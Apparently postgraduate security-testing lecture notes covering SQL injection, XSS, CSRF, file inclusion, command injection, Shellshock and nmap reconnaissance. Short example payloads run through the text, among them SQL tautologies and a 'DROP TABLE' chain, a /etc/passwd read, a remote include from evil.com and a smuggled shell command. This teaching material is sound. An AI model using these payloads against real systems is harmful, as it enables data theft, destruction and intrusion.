---
permalink: /course/postgraduate/sectest
title: Security Testing
---

{% include title_patch.html %}

{% include gen_index.html %}

# Web attacks

## SQL Injection
### Sinks (Where to Inject)

- GET/POST parameters: many client-side technologies communicate 
  with the server through GET/POST (e.g., AJAX, and also the now 
  deprecated Flash, Applet Java).
- every HTTP header: they must be treated as dangerous since it can be 
  very easily maliciously altered by a user and should not be trusted 
  (e.g., User-Agent, Referer).
- Cookies: after all, cookies are just HTTP headers, ... and they come from 
  the client => dangerous.
- Database itself: risk of 2nd order SQLi (explained later), if 
  the input of the application is stored in the database; 
  later, the same input may be fetched from the database and used 
  to build another query => dangerous 

### Target (What Can be Done by Injection)

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/sqlitarget.png"  alt=""/>
</div>

### SQLi: Tautologies

**Tautologies** are statements that are always true. 
They can be used as a tool for SQL injection. 
The most common uses include authentication bypass, 
and also showing all the records contained in a certain table. 

Comment for SQL:  
-- is a standard SQL comment.  
\# is a MYSQL comment.

There are several examples
```sql
#1 Input: "' OR '1'='1"
Note: If mysql_escape_string() is used, we could escape this by reverse slash "\"
like this \' OR \'\'=\'
#2 Input: "' OR 1=1 # "
#3 Input: "' OR user LIKE '%' #"
#4 Input: "' OR 1 #"
#5 Input: ' OR 'vulnerability'>'server'
Note: Bypass IDS by diverging from the more obvious tautologies
```

### SQLi: String SQLi vs. Numeric SQLi
If you are exploiting numeric SQLi, be aware of quote. There is no quote for numbers.

```sql
SELECT * 
FROM user_data
WHERE Login_Count = 1
AND userid = 1 OR 1 = 1
```

### SQLi: Union query

The UNION operator is used to combine the result-set of two or more SELECT statements.
- Each SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
- The columns in each SELECT statement must also be in the same order

It is important to note that:
- The **number** and **types** of the columns returned by the two SELECT must match.

As an exception, in the **MySQL** database if the types do not match, 
a cast is performed automatically.

We could use this to detect the total columns in this table.

```sql
Input: "' union SELECT 1,1,1,1--"
SELECT * FROM users where username='' union SELECT 1,1,1,1--'
Note: if the table has 4 columns here it would be no error otherwise it could throws exception.
```

### SQLi: 2nd Order Injection

2nd Order Injection occurs when malicious input value is saved in the database, 
and after that a new query is composed with the malicious value saved 
in the database. 

```sql
First Input: username="admin'--"
UPDATE users SET pass='new password' WHERE user='admin'--'
```

### SQLi: Piggy-backed/Chained

Multiple commands are executed.

As a warning, SQLi piggy-backing/chaining may not work depending on 
the method/function invoked to perform the query.

```sql
Input: "'; DROP TABLE users −− "
SELECT id FROM users 
WHERE user=''; 
DROP TABLE users -- ' AND pass=''
```

### MYSQLi: Information Schema

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/infoschema.png"  alt=""/>
</div>

See more at https://websec.ca/kb/sql_injection

### SQLi: Blind SQLi

Blind SQL injection is a type of SQL injection attack that asks 
the database true or false questions and determines the answer 
based on the applications response.

- This attack is often used when the web application is configured to 
  show generic error messages, but has not mitigated the code 
  that is vulnerable to SQL injection.
- Most of the time you start by finding which type of database is used, 
  based on the type of database you can find the system tables 
  of the database you can enumerate all the tables present in the database.
  - With this information you can start getting information from 
    all the tables and you are able to dump the database.
- In general, Blind SQLi is much harder to exploit successfully than 
  traditional SQLi

**Common Expression Used in Exploitation**
- **IF(expression, expr_true, expr_false)**
- **SUBSTRING**:
  - SUBSTRING(str, pos)
  - SUBSTRING(str, FROM_pos)
  - SUBSTRING(str, pos, len)
  - SUBSTRING(str, FROM_pos, FOR_len)

It is also common to see this using time-based techniques.
- **BENCHMARK(loop_count, expression)** (mysql):  
  We could compare the time which server used to executing the command. If 
  the BENCHMARK command is executed, it slows down the speed that server process
  it. **IF YOUR NETWORK ISN'T STABLE, THE RESULT MIGHT WRONG.**

### MYSQLi: File Based Technique
MySQL offers some functionalities for reading and writing file results.

Be aware of:
- File operation fail if "FILE" permission is not granted
- load_file returns NULL upon failure
- "Into outfield" triggers a MySQL ERROR

```sql
SELECT LOAD FILE('<file path>')
SELECT <query> INTO OUTFILE '<file path>'
```

### SQLi: Countermeasures

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/sqlicounter.png"  alt=""/>
</div>

## Client Side Attacks
### XSS
#### Reflected XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.001.jpeg"  alt=""/>
</div>

#### Stored XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.002.jpeg"  alt=""/>
</div>

#### DOM-based XSS

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/xss.003.jpeg"  alt=""/>
</div>

### CSRF

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/csrf.png"  alt=""/>
</div>

1. The bad guy sends a page to the victim user.
2. The victim opens the page in his browser, thus triggering an HTTP GET request 
   to the malicious website.
3. The website returns an HTTP 200 response, with an HTML page and a form. 
   The "action" tag of the form is however an external website.
4. When the user submits the form, he sends the information to 
   the vulnerable Web server, triggering a "fake voting service".

### Countermeasures

#### Client-side
- Reflected XSS: if the attack is shown in the URL, accessing directly 
  the domain root (without clicking on the full URL) would prevent 
  Reflected XSS (but not Stored XSS).
- NoScript Firefox/Chrome extension (and similar extensions for 
  other browsers) - **disables JavaScript by default**
- Do not visit other websites while logged onto other (sensitive) services.
#### Server-side
- **Input validation**: Input should always be considered untrusted and 
  should be always sanitized (e.g., htmlspecialchars())
- Against CSRF:
  - CAPTCHA/PIN to specify in every sensitive action/request/transaction
  - **CSRF tokens**: hidden parameters with unpredictable values passed 
    by the application (most used/effective option)

#### CSRF Token

1. The user browser sends an HTTP GET request to a Web server page.
2. The Web server sends the page, and embeds a randomly generated "CSRF token" in it. 
   The CSRF token is unique for this HTTP response, and any other user request 
   would generate a new CSRF token.
3. The user browser sends a post request, attaching the cookie information and 
   the CSRF token.

In this way, the Web server has an authentication mechanism to know that 
the user is actually performing an operation from a Web page generated by the Web server.

- A unique value is sent in HTTP responses by a Web server
- Every client request is checked by the Web server to have this unique, 
  valid CSRF token

## Bypass Client-Side Controls
These could be bypass using dev tools or interpreter
### Hidden Form Fields
```html
<input type="hidden" name="price" value="449">
```
It would be shown in HTTP request
```http request
price=449
```

### Length Limits
```html
<input type="text" name="quantity" maxlength="1">
```

### Disable Elements
```html
<input type="text" name="price" disabled="true" value="449">
```

### Script based Validation
```html
<form method="post" action="submit" onsubmit="return validateForm(this)">
</form>
<script>
    function validateForm(Form) {
        ...
    }
</script>
```

## Local/Remote File Inclusion
```php
<?php
include $_GET['lang'];
?>
```

```url
http://site.com/test?lang=/etc/passwd

http://site.com/test?lang=http://evil.com/code.txt (causing RCE)
```

### countermeasure
```url
php://filter

php://filter/read=a|b/resource=f (applies filters a and b while reading f)
php://filter/write=a|b/resource=f
php://filter/a|b/resource=f (read and write)
```

## Command Injection
```php
<?php
$host = $_GET['host'];
system('ping -c 4 ' . $host);
?>

http://site.com/ping.php?host=a;cat%20/etc/passwd
```

### Shellshock
- Also known as BashDoor
- It is a Bash (versions<=4.3) vulnerability, widely present in Linux systems
- Discovered in 2014, but originally introduced in Bash in 1989
- Used for command execution from environment variables unintentionally

character sequence: `() { :;};`
```shell
$ env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"
```

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/shellshock.png"  alt=""/>
</div>

## Race Condition in Web Apps

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/concurrency.png"  alt=""/>
</div>

- Unexpected parallelism can lead to unforeseen interactions
- Parallelism can be controlled client-side
- synchronization primitives are seldom used, and their efficacy is often system-dependent

# Network Reconnaissance
## Network Security Assessment
1. **Reconnaissance** to identify networks, hosts, and users of interest
2. **Vulnerability scanning** to identify potentially exploitable conditions
3. **Investigation of vulnerabilities** and further probing by hand
4. **Exploitation of vulnerabilities** and circumvention of security mechanisms

### Phase 1: Reconnaissance
Reconnaissance explores the tactics to identify hosts, networks, 
and users of interest, and it can be either passive or active.

- **Passive**: Open Source Intelligence (OSINT)
  - e.g., web search engines, WHOIS databases, DNS servers
- **Active**: Scanning target network
  - Network map reconstruction
  - Host enumeration
  - Port enumeration


### Phase 2: Vulnerability Scanning

Vulnerability scanning is usually supported by tools, 
and it may be useful to expose vulnerable or unpatched services running 
in a target network. Some of the most popular vulnerability scanning tools include:

- nmap (which we will analyze in-depth later in this topic)
- Nessus
- Rapid7 Nexpose
- QualysGuard

In general, scanning is also useful for:
- Service enumeration (to identify vulnerable versions of services)
- Insights into firewall Access Control Lists (ACLs)

### Phase 3: Investigation of Vulnerabilities

Vulnerabilities are found by "researchers". They can then either be 
**responsibly** disclosed to the product vendor (so they can patch it), 
or **irresponsibly** to customers willing to pay for new vulnerabilities 
(huge black market for zero-days).

The following diagram depicts an overview of how a vulnerability 
can pass from the private domain to the public, either 
via **responsible disclosure** or **weaponization**.

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/investigation.png"  alt=""/>
</div>

### Phase 4: Exploitation of Vulnerabilities

There is a plethora of tools to support also the exploitation of vulnerabilities, 
as we will see later in the course. Some tools include Rapid7 Metasploit, 
CORE Impact, Immunity CANVAS. An important remark to make is that, 
as we have seen in other steps of the security testing pipeline, 
humans cannot be replaced by tools. Also here, tools can only 
successfully exploit the easiest types of vulnerabilities, but it may require 
some scripting and exploit writing to identify and exploit real vulnerabilities 
in more complex systems.

### Iterative Process
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/iterative.png"  alt=""/>
</div>

## Passive Reconnaissance
### Querying Search Engines and Websites
The following classes of data are often uncovered by querying search engines 
and websites:

- Physical addresses of office locations
- Contact details, including email addresses and telephone numbers
- Details of internal email systems and routing
- DNS layout and naming conventions
- Files residing on publicly accessible servers

#### Google Search
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/google.png"  alt=""/>
</div>

#### Querying Netcraft
The Netcraft Web Application contains historical server fingerprints, 
which you can use to check OS versions or map network blocks of a company.

#### Shodan
Shodan is a service that collects network scan data results. 
You may identify exposed and/or unhardened services. 
The Metasploit tool also relies on shoran, optionally.

#### LinkedIn
Even if it may seem just as a social network, in practice LinkedIn - 
and especially LinkedIn Premium may be useful to look for people and roles 
without notifying them.

#### Domain WHOIS
The WHOIS query and response protocol contains useful public information 
about domain registrars (although sometimes this can be anonymized). 
Typically, it contains:

- Administrative contact details (names, email addresses, and telephone numbers)
- Mailing addresses for office locations relating to the target organization
- Details of authoritative name servers for each domain

#### Automated Email Enumeration
The TheHarvester tool supports automatic search and collection of email/hosts 
on public search engines.

#### DNS Querying
By querying name servers, you may find information about 
registered name servers and some exposed services.

### Countermeasures
- **Disable directory indexing** on Web servers
- Use “**robots.txt**” to prevent indexing of certain content by search engines
  - but do NOT rely on it to protect sensitive data
- Use **generic details in WHOIS data** (or privacy-protect it)
- **Disable DNS zone transfers to untrusted hosts**
- **Prune DNS zone files from unnecessary information**
- **Preventing TypoSquatting**: you may check if a similar domain is available.

## Active Reconnaissance
### nmap
nmap enables 10+ types of scanning methods
- Some scanning methods may be blocked
- Doing an intersection fo different scanning strategies allows you to
  gather more information
  
### Host Scanning
The presence of an IP within a domain zone does not necessarily imply
that the IP is reachable through Internet.  
You need to verify, for each potential “target” system:
- If it is active (or not)
- If it is reachable (or not)

<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/hostscan.png"  alt=""/>
</div>

One of the first step in reconstructing a map of the target network is
the automated execution of a series of ping commands on intervals of IP
addresses and network blocks, to determine which systems are active  
Known Techniques:
- Ping sweep
- ICMP sweep

Limitation: Normally the “ping” command is used to send packets ICMP
ECHO_REQUEST to a system, soliciting the return of a segment ICMP
ECHO_REPLY, which indicates that the system is functioning

#### Defense
Defense:
- Block all ICMP traffic
  
Counter-defense:
- scan ports at the transfer layer (TCP/UDP):
  - e.g., through nmap or hping3
  
### nmap Ping sweep
Unlike fping, the option -sP of nmap allows you to send in parallel:
- An ICMP ECHO_REQUEST packet
- A TCP ACK (to port 80)
  - In this way, also “hosts” blocking ICMP packets can be detected
  
### Port Scanning
Trying to connect to TCP and UDP ports of the target system to
determine which network services are in execution (or LISTENING)  
Knowing active ports offers important knowledge that can be
exploited to attack a system
- Well-known ports are typically associated with known services
- e.g., Web Server on ports 80, 8080, and 443

#### UDP Portscan
- A zero-length UDP packet is sent to each port
- If an ICMP error "port unreachable" is received the service is assumed unavailable

#### TCP Portscan
- Most services are statically associated with port numbers (/etc/services in \*NIX)

**TCP SYN Scanning**
- aka "half-open" scanning
- If an SYN/ACK packet is answered, the port is open
- If RST packet is answered, the port is closed
- Then attacker send RST packet to avoid open the connection

**TCP FIN Scanning**
- RST packet is sent back if port is closed
- Ignored if port is open
- Windows always send RST back

**Idle Scanning**
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/idlescanning.png"  alt=""/>
</div>

### OS Fingerprinting
```shell
nmap -O ip_address
```
<div style="text-align:center">
<img src="/static/course/postgraduate/sectest/osfingerprinting.png"  alt=""/>
</div>

### Enumeration
By grabbing the headers of exposed services, nmap (option -sV) can try
to infer the exact service version
- First step before looking for vulnerabilities (e.g., on public repos)

